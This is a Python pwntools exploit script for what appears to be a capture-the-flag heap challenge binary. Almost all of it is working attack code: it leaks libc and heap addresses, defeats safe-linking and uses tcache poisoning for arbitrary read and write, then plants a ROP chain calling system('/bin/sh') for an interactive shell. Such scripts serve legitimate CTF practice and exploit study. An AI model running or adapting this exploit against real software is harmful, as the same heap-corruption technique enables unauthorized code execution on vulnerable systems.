#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from multiprocessing import heap
from os import remove
from tkinter import FLAT
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')
libc=exe.libc
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
def malloc(size,index):
    io.sendline(b"1")
    io.sendlineafter(b"index:",str(index).encode())
    io.sendlineafter(b"size:",str(size).encode())
def edit(index,content):
    io.sendline(b"2")
    io.sendlineafter(b"Index:",str(index).encode())
    io.sendafter(b"content:",content)
def view(index):
    io.sendline(b"3")
    io.sendlineafter(b"Index:",str(index).encode())
def delete(index):
    io.sendline(b"4")
    io.sendlineafter(b"Index:",str(index).encode())

io = start()

malloc(0x500,0)
malloc(0x60,1)
delete(0)
malloc(0x500,0)
view(0)
io.recvuntil(b"note : ")
libc_addr=u64(io.recvline(False).ljust(8,b"\x00"))
libc_addr=libc_addr-0x21ace0
libc.address=libc_addr
success(f"LIBC LEAK@: {hex(libc.address)} ")
#lek heap and safe linking
malloc(0x90,2)
delete(2)
malloc(0x90,2)
view(2)
io.recvuntil(b"note : ")
key=u64(io.recvline(False).ljust(8,b"\x00"))
heap_base = key<<12
success(f"SAFE LINKING KEY LEAK@: {hex(key)} ")
success(f"HEAP BASE LEAK@: {hex(heap_base)} ")
delete(1)
delete(2)
#arb read
malloc(0x78,3) # 3
malloc(0x78,4) # 4 
malloc(0x78,5) # 4 
delete(5)
delete(4) # 4
edit(3,b"A"*0x78+p64(0x81)+p64(libc.sym.environ^key))
malloc(0x78,4)  
malloc(0x78,5) 
view(5)
io.recvuntil(b"note : ")
environ=u64(io.recvline(False).ljust(8,b"\x00"))
success(f"ENVIRON LEAK@: {hex(environ)} ")
#arb write
malloc(0x18,1)
malloc(0x18,2)
malloc(0x18,3)
delete(1)
delete(2)
delete(3)
malloc(0x108,3) # 3
malloc(0x108,4) # 4 
malloc(0x108,5) # 4 
delete(5)
delete(4) # 4
edit(3,b"B"*0x108+p64(0x111)+p64((environ-0x128)^key))
malloc(0x108,4)  
malloc(0x108,5)

rop = ROP(libc) # indica che fai rop sul libc
rop.raw(rop.ret.address)
rop.system(next(libc.search(b"/bin/sh")))
edit(5,p64(0xdeadbeef)+rop.chain())

io.sendline(b"5") 
io.interactive()
